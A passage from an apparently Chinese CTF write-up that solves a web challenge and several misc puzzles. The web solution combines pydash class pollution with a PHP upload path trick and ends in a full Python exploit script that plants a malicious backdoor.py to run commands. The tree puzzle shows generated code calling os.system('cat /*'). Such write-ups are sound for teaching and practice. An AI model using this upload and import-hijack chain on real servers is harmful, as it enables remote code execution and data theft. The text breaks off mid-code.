class="hljs-string">&#x27;/^(data:\s*image\/(\w*);base64,)/&#x27;</span>, <span class="hljs-variable">$base64</span>, <span class="hljs-variable">$result</span>)) &#123;<br><br>        <span class="hljs-variable">$type</span> = <span class="hljs-variable">$result</span>[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">check_extension</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-title function_ invoke__">time</span>() . <span class="hljs-string">&quot;/&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$res</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$res</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br>        <span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;    <span class="hljs-comment">//图片名以时间命名</span><br>        <span class="hljs-comment">//保存为文件</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$newFile</span>, <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$result</span>[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$base64</span>)))) &#123;<br>            <span class="hljs-comment">//返回这个图片的路径</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$newFile</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;base64&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">check_path</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])) &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">up_base64</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>], <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>));<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$res</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;upload success&lt;/h1&gt;&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hacker!&lt;/h1&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>同时扫描网址发现存在<code>/app</code>路由</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">from</span> challenge <span class="hljs-keyword">import</span> challenge<br><span class="hljs-keyword">import</span> re<br><br>app = Flask(__name__)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">value: <span class="hljs-built_in">str</span></span>):<br>    black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br>    <span class="hljs-keyword">if</span> re.findall(<span class="hljs-string">&quot;r&#x27;[^\w\.\[\]]&#x27;&quot;</span>, value):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> black_list:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> value:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/set&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set</span>():<br>    key, value = request.json.get(<span class="hljs-string">&#x27;key&#x27;</span>), request.json.get(<span class="hljs-string">&#x27;value&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key <span class="hljs-keyword">or</span> <span class="hljs-built_in">type</span>(key) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Not key or key must be str&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key may be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> value <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">20</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value may  be too long!&quot;</span>&#125;, <span class="hljs-number">400</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> value:<br>        game.complete(value)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Key set success !&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value) != <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Value must be a string!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check(key):<br>        <span class="hljs-built_in">print</span>(key)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Hacker!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># pydash?</span><br>    <span class="hljs-keyword">if</span> game.<span class="hljs-built_in">set</span>(key, value):<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Task updated!&quot;</span>&#125;, <span class="hljs-number">200</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid task name!&quot;</span>&#125;, <span class="hljs-number">400</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_source</span>():<br>    fp = <span class="hljs-built_in">open</span>(__file__)<br>    res = fp.read()<br>    fp.close<br>    <span class="hljs-keyword">return</span> res.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot; &quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/app/get&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_date</span>():<br>    <span class="hljs-keyword">import</span> backdoor<br>    flag = backdoor.backdoor()<br>    sys.modules.pop(<span class="hljs-string">&quot;backdoor&quot;</span>)<br>    <span class="hljs-keyword">return</span> flag<br><br><br>game = challenge()<br>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">3000</span>)<br></code></pre></td></tr></table></figure><p>其中有三个路由</p><p><code>/app</code>显示当前代码<br><code>/app/get</code>存在后门，有导入包的操作<br><code>/app/set</code>用于设置键值对</p><p>其中存在提示<code># pydash?</code>，表示通过<code>pydash</code>设置属性，而<code>pydash</code>低版本存在类污染，可以利用<code>pydash.set</code>来设置或覆盖属性值，也可以设置路径</p><p>在<code>/app/get</code>路由中存在一个<code>import</code>的操作，当<code>Python</code>解释器遇到<code>import</code>语句时，它会在<code>sys.path</code>变量中指定的路径中搜索模块，其中<code>sys.path[0]</code>则表示最初调用<code>Python</code>解释器的脚本所在的绝对路径</p><p>所以我们可以上传一个名称为<code>backdoor</code>的py文件，再利用<code>pydash.set</code>覆盖<code>sys.path[0]</code>的值，使其寻找包时找到我们的恶意包</p><p>同时题目中还存在一个waf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list = [<span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;_static_folder&quot;</span>, <span class="hljs-string">&quot;pardir&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>,<br>                  <span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-string">&quot;jinja&quot;</span>, <span class="hljs-string">&quot;modules&quot;</span>, <span class="hljs-string">&quot;exported&quot;</span>,<span class="hljs-string">&quot;loader&quot;</span>,<span class="hljs-string">&quot;__spec__&quot;</span>]<br></code></pre></td></tr></table></figure><p>可以利用<code>pydash.helpers</code>导入<code>inspect</code>来绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-2.png"></p><p>还有一点要注意，上传时对<code>$type</code>进行了检查，不允许上传<code>py</code>类型的文件，但是<code>$type</code>的值是可控的，我们可以将其置空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//line 32</span><br><span class="hljs-variable">$newFile</span> = <span class="hljs-variable">$res</span> . <span class="hljs-variable">$file_path</span> . <span class="hljs-string">&quot;.<span class="hljs-subst">&#123;$type&#125;</span>&quot;</span>;<br></code></pre></td></tr></table></figure><p>如果<code>$type</code>为空，就会在文件尾加一个点，例如<code>backdoor.py.</code></p><p>这里可以用<code>file_put_contents</code>的一个<code>trick</code>绕过，如图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/easy_upload-3.png"></p><p>例如<code>backdoor.py/.</code>，<code>file_put_contents</code>会自已给标准化成绝对路径</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br>shell = <span class="hljs-string">&#x27;&#x27;&#x27;import os</span><br><span class="hljs-string">def backdoor():</span><br><span class="hljs-string">    return os.popen(&quot;cat /flag&quot;).read()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    data = <span class="hljs-string">&quot;data:image/;base64,&quot;</span> + base64.b64encode(shell.encode()).decode()<br>    start = <span class="hljs-built_in">int</span>(time.time())<br>    res = requests.post(<br>        url=url+<span class="hljs-string">&quot;index.php?action=base64&amp;path=backdoor.py/&quot;</span>, data=data)<br>    end = <span class="hljs-built_in">int</span>(time.time())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end+<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(i)<br>        data = &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>: <span class="hljs-string">&quot;__init__.__globals__.pydash.helpers.inspect.sys.path[0]&quot;</span>,<br>            <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;/tmp/%s/&quot;</span> % (i)<br>        &#125;<br>        <span class="hljs-built_in">print</span>(data)<br>        requests.post(url=url+<span class="hljs-string">&quot;app/set&quot;</span>,json=data)<br>        res = requests.get(url=url+<span class="hljs-string">&quot;app/get&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag??&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code != <span class="hljs-number">500</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(res.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    exploit()<br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>zip注释：<code>The art of 0 and 1, and it will remain shorter than 9.</code></p><p>生成字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):<br>    bin_strings = [<span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(i) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**i)]<br>    my_dict[i] = bin_strings<br><span class="hljs-keyword">for</span> key,value <span class="hljs-keyword">in</span> my_dict.items():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;dic.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> value:<br>            f.write(i+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>爆破得到密码<code>01001101</code></p><p>解压得到flag</p><h2 id="SimpleDocument"><a href="#SimpleDocument" class="headerlink" title="SimpleDocument"></a>SimpleDocument</h2><p>图片分离出一个pdf，用pdf编辑器全选，发现有一个隐藏的文本</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/SimpleDocument.png"></p><h2 id="BeautifulImage"><a href="#BeautifulImage" class="headerlink" title="BeautifulImage"></a>BeautifulImage</h2><p>stegsolve分析，0通道藏有base加密字符串</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/BeautifulImage.png"></p><h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>下载附件得到一个<code>tree.py</code>，约有60w行代码</p><p>部分代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># the o mean is 0!</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0aB30386</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o02aA7B4</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">1705</span> &lt; <span class="hljs-number">2926</span>:<br>            tree_b270co58.tree_f79D6eB3(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_51o1oA3a</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_433218o8</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">1793</span> &lt; -<span class="hljs-number">5366</span>:<br>            tree_B813Fe08.tree_AaA1b735(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_2598o3do</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7C0ooB75</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">7226</span> &gt; -<span class="hljs-number">7705</span>:<br>            tree_3482o9ob.tree_0d6aDA0F(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_0a351C93</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_39cD9171</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">9865</span> &lt; <span class="hljs-number">592</span>:<br>            tree_Coc29fcC.tree_22E98104(self)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_170EE546</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_70759F44</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> -<span class="hljs-number">8714</span> &lt; <span class="hljs-number">4093</span>:<br>            tree_8D0oE9Cf.tree_2F7682e6(self)<br></code></pre></td></tr></table></figure><p>且存在部分函数调用<code>os.system</code>，执行的语句均为<code>cat /*</code></p><p>除了<code>os</code>函数外，其他函数都存在一个<code>if</code>，判断成功时引用下一个类</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_91fo80eD</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_7040e9o9</span>(<span class="hljs-params">self</span>):<br>       os.system(<span class="hljs-string">&#x27;cat /*&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_88eF054e</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_o00o0b68</span>(<span class="hljs-params">self</span>):<br>       tree_91fo80eD.tree_7040e9o9(self)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">tree_1a0c10D0</span>():<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">tree_4Cc0o1Do</span>(<span class="hljs-params">self</span>):<br>       tree_88eF054e().tree_o00o0b68(self)<br></code></pre></td></tr></table></figure><p>这段代码的完整利用链为：<br><code>tree_1a0c10D0.tree_4Cc0o1Do() -&gt; tree_88eF054e.tree_o00o0b68() -&gt; tree_91fo80eD.tree_7040e9o9()</code></p><p>所以我们需要分析代码，找到最终触发<code>os.system</code>的利用链，并提取出来</p><p>同时对所有<code>os.system</code>语句标记污点，如果遇到<code>if</code>判断错误的，则直接取消污点标记，并一直往上寻找最终利用链，并记录类名、函数名和函数内的具体内容</p><p>根据提示<code># the o mean is 0!</code>，提取所有完整利用链的类名的后8位十六进制字符，并将o转化为0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> astor<br><br><span class="hljs-comment"># 解析Python文件，获取语法树</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;tree.py&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>   source_code = file.read()<br>syntax_tree = ast.parse(source_code)<br><br><span class="hljs-comment"># 初始化类名和函数字典</span><br>class_dict = &#123;&#125;<br><br><span class="hljs-comment"># 遍历语法树，获取类和函数名</span><br><span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> syntax_tree.body:<br>   <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, ast.ClassDef):<br>       class_name = node.name<br>       class_dict[class_name] = &#123;&#125;<br>       <span class="hljs-keyword">for</span> inner_node <span class="hljs-keyword">in</span> node.body:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(inner_node, ast.FunctionDef):<br>               func_name = inner_node.name<br>               class_dict[class_name][func_name] = []<br>               <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> inner_node.body:<br>                   class_dict[class_name][func_name].append(astor.to_source(code).strip())<br><br><span class="hljs-comment"># 输出结果</span><br><br>class_keys = []<br><span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>   <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(func_dict):<br>       sub = func_dict[<span class="hljs-number">1</span>][<span class="hljs-built_in">list</span>(func_dict[<span class="hljs-number">1</span>].items())[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>       <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       <span class="hljs-keyword">elif</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>           <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &gt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>               <span class="hljs-keyword">continue</span><br>       class_keys.append(func_dict[<span class="hljs-number">0</span>])<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> class_keys:<br>   class_key = key<br>   func_key = <span class="hljs-built_in">list</span>(class_dict[class_key])[<span class="hljs-number">0</span>]<br>   list_class = [class_key]<br>   flag = <span class="hljs-number">1</span><br>   flags = <span class="hljs-number">0</span><br>   <span class="hljs-keyword">while</span> flag != <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> flags == <span class="hljs-number">0</span>:<br>       flag = <span class="hljs-number">1</span><br>       flags = <span class="hljs-number">0</span><br>       <span class="hljs-keyword">for</span> func_dict <span class="hljs-keyword">in</span> class_dict.items():<br>           <span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> func_dict[<span class="hljs-number">1</span>].items():<br>               <span class="hljs-comment"># print(func_dict[1].items(), flag)</span><br>               <span class="hljs-keyword">if</span> class_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> func_key <span class="hljs-keyword">in</span> code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:<br>                   sub = code[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27;\n&#x27;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)<br>                   <span class="hljs-keyword">if</span> sub[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>                       <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">1</span>]) &lt; <span class="hljs-built_in">int</span>(sub[<span class="hljs-number">3</span>][:-<span class="hljs-number">1</span>]):<br>                           flag = -<span class="hljs-number">1</span><br>                   <span class="hljs-keyword">elif</span> sub[<span 